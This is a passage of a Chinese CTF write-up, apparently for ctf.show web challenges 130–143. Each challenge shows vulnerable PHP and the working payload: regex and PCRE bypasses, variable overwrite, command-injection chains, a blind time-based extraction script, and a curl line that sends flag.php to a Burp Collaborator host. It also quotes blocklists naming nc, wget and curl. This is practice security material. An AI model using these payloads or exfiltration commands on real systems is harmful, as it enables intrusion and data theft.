class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url=&quot;http://e07a37a6-9144-4f12-a24c-2fcd2f8cdbd0.challenge.ctf.show/&quot;</span><br><span class=\"line\">data=&#123;</span><br><span class=\"line\">    &#x27;f&#x27;:&#x27;very&#x27;*250000+&#x27;ctfshow&#x27;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">r=requests.post(url,data=data)</span><br><span class=\"line\">print(r.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web131\"><a href=\"#web131\" class=\"headerlink\" title=\"web131\"></a>web131</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">if(isset($_POST[&#x27;f&#x27;]))&#123;</span><br><span class=\"line\">    $f = (String)$_POST[&#x27;f&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(preg_match(&#x27;/.+?ctfshow/is&#x27;, $f))&#123;</span><br><span class=\"line\">        die(&#x27;bye!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(stripos($f,&#x27;36Dctfshow&#x27;) === FALSE)&#123;</span><br><span class=\"line\">        die(&#x27;bye!!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    echo $flag;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>老老实实用PCRE回溯吧</p>\n<h3 id=\"web132\"><a href=\"#web132\" class=\"headerlink\" title=\"web132\"></a>web132</h3><p>扫出&#x2F;admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if(isset($_GET[&#x27;username&#x27;]) &amp;&amp; isset($_GET[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $username = (String)$_GET[&#x27;username&#x27;];</span><br><span class=\"line\">    $password = (String)$_GET[&#x27;password&#x27;];</span><br><span class=\"line\">    $code = (String)$_GET[&#x27;code&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        if($code == &#x27;admin&#x27;)&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这题的突破点在于</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(false &amp;&amp; false || true)&#123;</span><br><span class=\"line\">\techo &quot;true!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    echo &quot;false!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//返回结果为true</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=admin&amp;password=admin&amp;username=admin</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web133\"><a href=\"#web133\" class=\"headerlink\" title=\"web133\"></a>web133</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;6个字母都还不够呀?!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">get传参   F=`$F `;sleep 3</span><br><span class=\"line\">经过substr($F,0,6)截取后 得到  `$F `;</span><br><span class=\"line\">也就是会执行 eval(&quot;`$F `;&quot;);</span><br><span class=\"line\">我们把原来的$F带进去</span><br><span class=\"line\">eval(&quot;``$F `;sleep 3`&quot;);</span><br><span class=\"line\">也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);</span><br><span class=\"line\">前面的命令我们不需要管，但是后面的命令我们可以自由控制。</span><br><span class=\"line\">这样就在服务器上成功执行了 sleep 3</span><br><span class=\"line\">所以 最后就是一道无回显的RCE题目了</span><br></pre></td></tr></table></figure>\n\n<p>无回显我们可以用反弹shell 或者curl外带 或者盲注<br> 这里的话反弹没有成功，但是可以外带。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl  http://xxx:4567?p=`tac f*`</span><br></pre></td></tr></table></figure>\n\n<p>当然要是没有公网ip的话，bp也可以帮到我们这个忙</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?F=`$F` ;curl -X post -F xx=@flag.php http://zadcth92f5pgqbtmchfdumhi49a0yp.burpcollaborator.net;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web134\"><a href=\"#web134\" class=\"headerlink\" title=\"web134\"></a>web134</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$key1 = 0;</span><br><span class=\"line\">$key2 = 0;</span><br><span class=\"line\">if(isset($_GET[&#x27;key1&#x27;]) || isset($_GET[&#x27;key2&#x27;]) || isset($_POST[&#x27;key1&#x27;]) || isset($_POST[&#x27;key2&#x27;])) &#123;</span><br><span class=\"line\">    die(&quot;nonononono&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\">if($key1 == &#x27;36d&#x27; &amp;&amp; $key2 == &#x27;36d&#x27;) &#123;</span><br><span class=\"line\">    die(file_get_contents(&#x27;flag.php&#x27;));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>用<code>extract</code>进行变量覆盖</p>\n<p>测试一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parse_str($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class=\"line\">var_dump($_POST);</span><br><span class=\"line\">//然后我们传入 _POST[‘a’]=123</span><br><span class=\"line\">会发现输出的结果为array(1) &#123; [&quot;‘a’&quot;]=&gt; string(3) “123” &#125;</span><br><span class=\"line\">也就是说现在的$_POST[‘a’]存在并且值为123</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?_POST[key1]=36d&amp;_POST[key2]=36d</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web135\"><a href=\"#web135\" class=\"headerlink\" title=\"web135\"></a>web135</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">//flag.php</span><br><span class=\"line\">if($F = @$_GET[&#x27;F&#x27;])&#123;</span><br><span class=\"line\">    if(!preg_match(&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;, $F))&#123;</span><br><span class=\"line\">        eval(substr($F,0,6));</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?F=`$F` ;cp flag.php 2.txt;</span><br><span class=\"line\">?F=`$F` ;uniq flag.php&gt;4.txt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web136\"><a href=\"#web136\" class=\"headerlink\" title=\"web136\"></a>web136</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>虽然过滤了很多，但是在linux中我们可以用tee写文件</p>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls|tee 1.txt</span><br><span class=\"line\">ls / |tee 1.txt</span><br><span class=\"line\">cat /f* |1.txt</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web137\"><a href=\"#web137\" class=\"headerlink\" title=\"web137\"></a>web137</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]); </span><br></pre></td></tr></table></figure>\n\n<p>很简单，直接调用ctfshow类里的getFlag方法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST:ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>\n\n<p>借用yu22x师傅的拓展</p>\n<blockquote>\n<p>php中 -&gt;与:: 调用类中的成员的区别<br>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法.</p>\n<p><strong>也就是说双冒号可以不用实例化类就可以直接调用类中的方法</strong></p>\n</blockquote>\n<h3 id=\"web138\"><a href=\"#web138\" class=\"headerlink\" title=\"web138\"></a>web138</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">class ctfshow</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        die(&quot;private class&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    static function getFlag()&#123;</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if(strripos($_POST[&#x27;ctfshow&#x27;], &quot;:&quot;)&gt;-1)&#123;</span><br><span class=\"line\">    die(&quot;private function&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br></pre></td></tr></table></figure>\n\n<p>相比于上一题，这个题过滤了冒号</p>\n<p>call_user_func中不但可以传字符串也可以传数组</p>\n<p>本地测试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class=\"line\">这时候会调用 classname中的 say_hello方法</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web139\"><a href=\"#web139\" class=\"headerlink\" title=\"web139\"></a>web139</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">function check($x)&#123;</span><br><span class=\"line\">    if(preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $x))&#123;</span><br><span class=\"line\">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c=$_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    check($c);</span><br><span class=\"line\">    exec($c);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt; </span><br></pre></td></tr></table></figure>\n\n<p>只能盲打咯</p>\n<p>脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">import string</span><br><span class=\"line\">str=string.digits+string.ascii_lowercase+&quot;-&quot;</span><br><span class=\"line\">result=&quot;&quot;</span><br><span class=\"line\">key=0</span><br><span class=\"line\">for j in range(1,45):</span><br><span class=\"line\">    print(j)</span><br><span class=\"line\">    if key==1:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    for n in str:</span><br><span class=\"line\">        payload=&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n)</span><br><span class=\"line\">        #print(payload)</span><br><span class=\"line\">        url=&quot;http://47f5a8e0-42e2-4260-9f27-ec8d922b6561.challenge.ctf.show/?c=&quot;+payload</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            requests.get(url,timeout=(2.5,2.5))</span><br><span class=\"line\">        except:</span><br><span class=\"line\">            result=result+n</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">            break</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web140\"><a href=\"#web140\" class=\"headerlink\" title=\"web140\"></a>web140</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_POST[&#x27;f1&#x27;]) &amp;&amp; isset($_POST[&#x27;f2&#x27;]))&#123;</span><br><span class=\"line\">    $f1 = (String)$_POST[&#x27;f1&#x27;];</span><br><span class=\"line\">    $f2 = (String)$_POST[&#x27;f2&#x27;];</span><br><span class=\"line\">    if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f1))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^[a-z0-9]+$/&#x27;, $f2))&#123;</span><br><span class=\"line\">            $code = eval(&quot;return $f1($f2());&quot;);</span><br><span class=\"line\">            if(intval($code) == &#x27;ctfshow&#x27;)&#123;</span><br><span class=\"line\">                echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(intval($code) == &#x27;ctfshow&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p>这里进行的是弱比较,可以用null绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$code = eval(&quot;return $f1($f2());&quot;); </span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">intval(&#x27;a&#x27;)==0 intval(&#x27;.&#x27;)==0 intval(&#x27;/&#x27;)==0</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5(phpinfo())</span><br><span class=\"line\">md5(sleep())</span><br><span class=\"line\">md5(md5())</span><br><span class=\"line\">current(localeconv)</span><br><span class=\"line\">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br></pre></td></tr></table></figure>\n\n<p>实际上乱弄一些函数都可以，最后得到的结果是null同样符合条件</p>\n<h3 id=\"web141\"><a href=\"#web141\" class=\"headerlink\" title=\"web141\"></a>web141</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    $v2 = (String)$_GET[&#x27;v2&#x27;];</span><br><span class=\"line\">    $v3 = (String)$_GET[&#x27;v3&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class=\"line\">        if(preg_match(&#x27;/^\\W+$/&#x27;, $v3))&#123;</span><br><span class=\"line\">            $code =  eval(&quot;return $v1$v3$v2;&quot;);</span><br><span class=\"line\">            echo &quot;$v1$v3$v2 = &quot;.$code;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p><code>/^\\W+$/</code> 作用是匹配非数字字母下划线的字符,</p>\n<p>看看下面这句话</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>显然这里的<code>phpinfo()</code>是不执行的，但数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>是可以执行phpinfo()命令的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval(&quot;return 1-phpinfo();&quot;);//可以执行</span><br></pre></td></tr></table></figure>\n\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1=1&amp;v3=-(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)-&amp;v2=1</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web142\"><a href=\"#web142\" class=\"headerlink\" title=\"web142\"></a>web142</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span class=\"line\">    if(is_numeric($v1))&#123;</span><br><span class=\"line\">        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span><br><span class=\"line\">        sleep($d);</span><br><span class=\"line\">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n\n<p>这里我们令<code>v1=0</code>就可以让<code>$d=0</code></p>\n<h3 id=\"web143\"><a href=\"#web143\" class=\"headerlink\" title=\"web143\"></a>web143</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;</span><br><span class=\"line\">    $v1 = (String)$_GET[&#x27;v1&#x27;];</span><br><span 